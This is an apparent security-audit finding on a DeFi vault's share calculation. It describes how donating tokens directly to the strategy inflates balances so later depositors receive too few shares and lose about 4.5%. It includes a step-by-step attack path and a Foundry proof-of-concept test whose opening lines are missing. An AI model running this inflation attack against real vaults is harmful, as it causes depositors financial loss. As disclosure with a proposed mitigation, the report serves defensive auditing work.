# Attacker can cause griefing to users by inflating the vault, which leads to significant loss of funds

### Summary

There is no distinction between funds that enter the vault via deposit and external transfers when calculating the balance of the strategy of each token.
This leads to inflating the vault and reducing the value of newly issued shares, which an attacker can use to cause significant loss of funds to users.

### Root Cause

### First Scenario: token0 balance is 0 :
In[`Vault:136`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L136) the vault calculates the amount of shares to mint by dividing by `bal1`. `bal1` is the total balance of token1 that the strategy has from all sources ( check line 56 ).
This means, if an attacker transfers directly tokens to the strategy, this instruction `shares = amount1 * totalSupply / bal1` will result in only a few amount of shares getting minted, causing significant loss to users.

### Second Scenario: token0 balance != 0 :
In [`Vault:149`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L149), shares = cross * totalSupply / bal0 / bal1;` also divides by the inflated bal1, which leads to less shares and the same amount of lost funds ( check the PoC ) .

### Internal Pre-conditions

There needs to be at least one deposit before the attack happens.

### External Pre-conditions

N/A

### Attack Path

1. First depositor ( legit user ) deposits : `IVault(vault).deposit(0, 2000, 0, 0)` , ( not necessarily amount0 == 0 , we will demonstrate this later in the PoC )
2. The attacker deposits `IVault(vault).deposit(0, 140, 0, 0);`. Now the attacker has 140 shares.
3. The attacker inflates the vault by transferring `100000` tokens directly ( no share minted --> totalSupply doesn't increase ).
4. Victim deposits `IVault(vault).deposit(1000, 1000, 0, 0);` for example.
5. Victim gets only `20` shares.
6. Victim calls `withdraw()`, they lose 4.5% of the amount that they intially deposited ( - $45 of 1000)
7. Attacker calls `withdraw()` to restore most of the tokens he donated.

Note that the values used here are not fixed, and different values can be used to achieve the same exploit.
The greater the numbers the greater the loss.

### Impact

- Each user that deposits after the attacker inflates the vault loses approximately %4.5.
- Using exactly these numbers the attacker loses 0.46% of his beginning balance ( griefing ). Which is x10 less than what each victim loses.

    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // token1

    address user4 = address(4);
    address owner = address(222);

    function setUp() public virtual {

        vm.startPrank(owner);
        vault = address(new Vault(address(wbtc), address(usdc)));
        strategy = address(new Strategy(address(pool), address(vault), rebalancer, feeRecipient));
        IVault(vault).setStrategy(strategy);

        vm.stopPrank();
    }

    
    function testGriefing() public {

        // First depositor deposits
        deal(address(wbtc), user, 1e8);
        deal(address(usdc), user, 100_000e6);
        vm.startPrank(user);
        wbtc.approve(vault, 1e8);
        usdc.approve(vault, 100_000e6);
        IVault(vault).deposit(0, 2000, 0, 0);
        vm.stopPrank();
    
        // Attacker inflates the vault
        uint256 ATTACKER_STARING_BALANCE = 20000000;
        deal(address(wbtc), user2, ATTACKER_STARING_BALANCE);
        deal(address(usdc), user2, ATTACKER_STARING_BALANCE);
        console.log("\n  Attacker Balance Before Attack: ", IERC20(usdc).balanceOf(user2));
        vm.startPrank(user2);
        wbtc.approve(vault, ATTACKER_STARING_BALANCE);
        usdc.approve(vault, ATTACKER_STARING_BALANCE);
        IVault(vault).deposit(0, 140, 0, 0);
        console.log("\n  Total Supply after attacker deposits: ",IVault(vault).totalSupply());
        IERC20(usdc).transfer(strategy, 100000);
        (uint256 token0BalanceBefore2, uint256 token1BalanceBefore2) = IVault(vault).balances();
        console.log("Total balance of token0 after attacker deposits: ",token0BalanceBefore2);
        console.log("Total balance of token1 after attacker inflates the vault: ",token1BalanceBefore2);
        vm.stopPrank();
    
        // Victim 1 deposits
        uint256 VICTIM_STARING_BALANCE = 1000;
        deal(address(wbtc), user3, VICTIM_STARING_BALANCE);
        deal(address(usdc), user3, VICTIM_STARING_BALANCE);
        console.log("\n  Victim 1 Balance Before Attack: ", IERC20(usdc).balanceOf(user3));
        vm.startPrank(user3);
        wbtc.approve(vault, VICTIM_STARING_BALANCE);
        usdc.approve(vault, VICTIM_STARING_BALANCE);
        IVault(vault).deposit(VICTIM_STARING_BALANCE, VICTIM_STARING_BALANCE, 0, 0);
        console.log("\n  Total Supply after victim 1 deposits: ",IVault(vault).totalSupply());

        console.log("Shares of user2 : ",IVault(vault).balanceOf(user2));
        console.log("Shares of user3 : ",IVault(vault).balanceOf(user3));
        (uint256 token0BalanceAfter, uint256 token1BalanceAfter) = IVault(vault).balances();
        console.log("Total balance of token0 after : ",token0BalanceAfter);
        console.log("Total balance of token1 after : ",token1BalanceAfter);

        // Victim 2 deposits
        deal(address(wbtc), user4, VICTIM_STARING_BALANCE);
        deal(address(usdc), user4, VICTIM_STARING_BALANCE);
        console.log("\n  Victim 2 Balance Before Attack: ", IERC20(usdc).balanceOf(user4));
        vm.startPrank(user4);
        wbtc.approve(vault, VICTIM_STARING_BALANCE);
        usdc.approve(vault, VICTIM_STARING_BALANCE);
        IVault(vault).deposit(0, VICTIM_STARING_BALANCE, 0, 0);
        console.log("\n  Total Supply after victim 2 deposits: ",IVault(vault).totalSupply());
        vm.stopPrank();

        
        // Victim 1 withdraws, losing 4.5% of his funds
        vm.startPrank(user3);
        IVault(vault).withdraw(IVault(vault).balanceOf(user3),0,0);
        console.log("\n  Victim 1 Balance After  Attack: ", IERC20(usdc).balanceOf(user3));
        vm.stopPrank();
        
        // Victim 2 withdraws, losing 4.5% of his funds
        vm.startPrank(user4);
        IVault(vault).withdraw(IVault(vault).balanceOf(user4),0,0);
        console.log("\n  Victim 2 Balance After  Attack: ", IERC20(usdc).balanceOf(user4));
        vm.stopPrank();

        // Attacker withdraws to restore the overwhelming majority of what he donated
        vm.startPrank(user2);
        IVault(vault).withdraw(IVault(vault).balanceOf(user2),0,0);
        console.log("\n  Attacker Balance After Attack: ", IERC20(usdc).balanceOf(user2));
        vm.stopPrank();

    }
}

### Mitigation

Differentiate between funds that enter the vault externally, and deposits.
